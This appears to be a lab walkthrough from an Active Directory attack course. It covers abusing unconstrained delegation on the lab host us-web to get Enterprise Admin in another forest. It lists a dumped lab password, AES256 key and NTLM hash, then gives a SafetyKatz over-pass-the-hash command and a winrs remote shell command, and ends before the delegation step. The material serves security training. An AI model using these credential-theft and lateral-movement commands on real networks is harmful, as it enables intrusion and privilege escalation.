# Hands-on 24: Cross Forest Attacks - Unconstrained Delegation

- [Hands-on 24: Cross Forest Attacks - Unconstrained Delegation](#hands-on-24-cross-forest-attacks---unconstrained-delegation)
  - [Task](#task)
  - [Abuse the Unconstrained Delegation on us-web to get Enterprise Admin privileges on usvendor.local](#abuse-the-unconstrained-delegation-on-us-web-to-get-enterprise-admin-privileges-on-usvendorlocal)

---

## Task

Abuse the Unconstrained Delegation on us-web to get Enterprise Admin privileges on usvendor.local

<br/>

---

## Abuse the Unconstrained Delegation on us-web to get Enterprise Admin privileges on usvendor.local

In [Hands-on 10](l10-Exchange.md), we dumped the following credential:

Note:
`us\webmaster`
- Password: `0wnerOftheIntraNetz`
- AES256: `2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0`
- NTLM: `23d6458d06b25e463b9666364fb0b29f`

<br/>

Over-pass-the-hash using this credential in an elevated prompt:

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /domain:us.techcorp.local /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /run:powershell.exe" "exit"
```

```
winrs -r:us-web.techcorp.local cmd.exe
```

<br/>

